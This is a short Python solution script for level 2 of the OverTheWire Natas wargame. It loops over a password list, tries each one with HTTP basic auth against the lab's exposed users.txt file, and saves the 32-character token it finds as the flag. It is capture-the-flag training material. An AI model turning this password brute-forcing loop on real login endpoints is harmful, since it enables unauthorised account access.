#!/usr/bin/env python


import requests
import re

from pathlib import Path
from bs4 import BeautifulSoup


password_file = Path('../passwords.txt')

level = 2
username = '%s%s' % ('natas', level)
passwords = open(password_file, 'r').readlines()

url = 'http://%s.natas.labs.overthewire.org/files/users.txt' % username


if __name__ == '__main__':

    # Read passwords and enforce bruteforce
    for password in passwords:

        password = password.strip()

        # Pass the username and password to request
        http = requests.post(url, auth=(username, password))

        if http.status_code != 200:
            pass

        else:
            # Create a BS parser
            soup = BeautifulSoup(http.text, 'html.parser')

            # Get the exact match using a pattern and print
            flag = re.search(r'[a-zA-Z0-9]{32}', soup.text).group(0)

            print(flag)

            # Save the flag
            with open('flag.txt', 'w') as out:
                out.write(flag)

            out.close()

            break
